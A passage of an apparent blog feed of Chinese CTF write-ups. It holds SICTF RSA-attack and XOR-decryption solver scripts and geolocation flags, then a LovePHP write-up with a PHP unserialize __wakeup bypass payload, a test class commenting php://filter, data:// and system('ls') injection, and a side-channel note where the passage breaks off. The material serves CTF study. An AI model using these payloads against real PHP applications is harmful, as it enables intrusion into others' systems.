class="line">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱</span><br></pre></td></tr></table></figure><p>emjio解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z</span><br></pre></td></tr></table></figure><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195022559-1700990465940-283.png"></p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195033374-1700990465941-284.png"></p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =<span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line">cipher =<span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>,<span class="number">2</span>**<span class="number">4</span>)</span>:</span><br><span class="line">    p4=<span class="number">0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590</span></span><br><span class="line">    p4=p4+<span class="type">int</span>(hex(i),<span class="number">16</span>)</span><br><span class="line">    print(hex(p4))</span><br><span class="line">    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数</span><br><span class="line">    print(p4.nbits())</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + <span class="type">p4</span></span><br><span class="line">    <span class="variable">roots</span> <span class="operator">=</span> f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>) #进行爆破</span><br><span class="line">    #print roots</span><br><span class="line">    <span class="keyword">if</span> roots:        #爆破成功，求根</span><br><span class="line">        p = p4+<span class="type">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;p: &quot;</span>, hex(<span class="type">int</span>(p)))</span><br><span class="line">        <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">        q = n/<span class="type">int</span>(p)</span><br><span class="line">        print(<span class="string">&quot;q: &quot;</span>, hex(<span class="type">int</span>(q)))</span><br><span class="line">        print(gcd(p,q))</span><br><span class="line">        phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        print(gcd(e2,phin))</span><br><span class="line">        d = inverse_mod(e2,phin)</span><br><span class="line">        print(<span class="string">&quot;d：&quot;</span>,d)</span><br><span class="line">        flag = pow(cipher,d,n)</span><br><span class="line">        flag = hex(<span class="type">int</span>(flag))[<span class="number">2</span>:]</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(flag)</span>, <span class="number">2</span>):</span><br><span class="line">            hex_int = <span class="type">int</span>(flag[i:i+<span class="number">2</span>], <span class="number">16</span>)  # 转换为整数</span><br><span class="line">            result += chr(hex_int)  # 转换为字符并拼接到结果字符串</span><br><span class="line">        print(<span class="string">&#x27;result :&#x27;</span>,result)</span><br><span class="line">        </span><br><span class="line"># SICTF&#123;3f9366ed-b8e4-<span class="number">412f</span>-bbd0-62616a24115c&#125;</span><br></pre></td></tr></table></figure><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_character</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_strings</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer_space</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> message[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    message[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertexts)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_spaces</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertexts):</span><br><span class="line">        res = [xor_strings(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> ciphertexts <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> position: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(is_character, [s[position] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            space_data.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;222.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    ciphertexts = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> file.readlines()]</span><br><span class="line"></span><br><span class="line">message = np.zeros([<span class="built_in">len</span>(ciphertexts), <span class="built_in">len</span>(ciphertexts[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">space_data = []</span><br><span class="line"></span><br><span class="line">find_spaces()</span><br><span class="line"></span><br><span class="line">space_data = <span class="built_in">sorted</span>(space_data, reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> weight, index, pos <span class="keyword">in</span> space_data:</span><br><span class="line">    infer_space(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> message]))</span><br><span class="line">hex_str1 = <span class="string">&quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;</span></span><br><span class="line">hex_str2 = <span class="string">&quot;Little Red Riding Hood promised&quot;</span></span><br><span class="line"></span><br><span class="line">bytes1 = <span class="built_in">bytes</span>.fromhex(hex_str1)</span><br><span class="line">bytes2 = <span class="built_in">bytes</span>(hex_str2, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(bytes1, bytes2)])</span><br><span class="line"></span><br><span class="line">result_str = result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result_str)</span><br></pre></td></tr></table></figure><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>低指数加密&#x2F;m高位攻击</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195045944-1700990465941-286.png"></p><h3 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> i * i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^<span class="built_in">int</span>(e) - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^<span class="built_in">int</span>(e) - c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">if</span> is_prime(i):</span><br><span class="line">        e = i</span><br><span class="line">        m=franklinReiter(n,e,c1,c2)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes((<span class="built_in">int</span>(m))))</span><br></pre></td></tr></table></figure><p>e应该是983</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195057189-1700990465941-285.png"></p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment"># from  Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># hint1 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># hint2 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint1 = &#123;hint1&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint2 = &#123;hint2&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># n = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line"><span class="comment"># hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line"><span class="comment"># hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,invert</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">n = <span class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">bar = tqdm(total=(<span class="number">1</span>&lt;&lt;<span class="number">12</span>)**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x1, x2 <span class="keyword">in</span> tqdm(product(<span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">12</span>,<span class="number">1</span>&lt;&lt;<span class="number">13</span>), repeat=<span class="number">2</span>)):</span><br><span class="line">    q = gcd(hint1*x1 -hint2*x2,n)</span><br><span class="line">    bar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h3><p>SICTF{北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p><h3 id="美女姐姐"><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h3><p>SICTF{福建省福州市仓山区烟台山公园}</p><h3 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h3><p>SICTF{山东省济宁市汶上县太子灵踪塔}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 赛事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023蓝帽杯  初赛web题解之LovePHP</title>
      <link href="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/"/>
      <url>/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/</url>
      
        <content type="html"><![CDATA[<h1 id="2023蓝帽杯-初赛web题解之LovePHP"><a href="#2023蓝帽杯-初赛web题解之LovePHP" class="headerlink" title="2023蓝帽杯  初赛web题解之LovePHP"></a>2023蓝帽杯  初赛web题解之LovePHP</h1><p>比赛过去好久了，才想起来把这道题给复现一下，前些天忙着学车了，也没空，明天开学了，今天来复现一下。过了好久也没环境了，只能来本地试试了</p><p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/image/image-20231126172215323-1700990592297-327-1701071506462-1.png" alt="image-20231126172215323"></p><p>源码看上去不难看懂，最主要有两个考点，file和反序列化的wakeup绕过</p><p>我们首先看一个小坑</p><p>由于php字符串解析的问题</p><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ul><li>删除空白符</li><li>将某些字符（ [ 空格 + . ）转换为下划线</li></ul><p><strong>实际应用：</strong></p><ul><li>get传参111_aa,不能直接传时，传111_aa。<br> &#x2F;&#x2F;php的变量解析绕过，[ 被处理成 _</li><li>当[提前出现后，后面的 . 就不会再被转义成_了。</li><li>当这些字符为首字母时，只有点号会被替换成下划</li></ul><p>所以这个题传参要用my[sercet.flag</p><p>知道了这个我们再来看wakeup怎么过吧，这个题目的php版本是7.43版的，跟那个cve-2016-7124版本对不上，上网搜了一下高版本php怎么让wakeup，要用C绕过<strong>C:8:”Saferman”:0:{}</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本地调试</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saferman</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span> = True;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === True)&#123;</span><br><span class="line">            <span class="comment">/*file(file_put_contents(&#x27;php://filter/write=convert.base64-decode/resource=1.txt&#x27;,&#x27;PD9waHAgcGhwaW5mbygpOz8+&#x27;));</span></span><br><span class="line"><span class="comment">            var_dump(file(&#x27;data://text/plain,&lt;?php system(\&#x27;ls\&#x27;);?&gt;&#x27;));*/</span></span><br><span class="line">            <span class="comment">//file(eval(&#x27;system(&quot;dir&quot;);&#x27;));</span></span><br><span class="line">            <span class="title function_ invoke__">file</span>(<span class="string">&#x27;&lt;?php eval(\&#x27;system(\&#x27;ls\&#x27;)\&#x27;)?&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check=False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;C:8:&quot;Saferman&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/image/image-20231126172304494-1700990592297-328-1701071506462-2.png" alt="image-20231126172304494"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload：?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure><p>接着绕过file</p><p><code>file()</code>函数读取文件后把内容储存到数组中，并不回显，最后找到两篇文章借鉴</p><p><a href="https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/">https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/</a></p><p><a href="https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/">https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</a></p><p><strong>侧信道攻击</strong>   侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现。而这里的file函数里面是可以用filter伪协议的</p><p>得到了一个侧信道攻击脚本</p><figure class="highlight 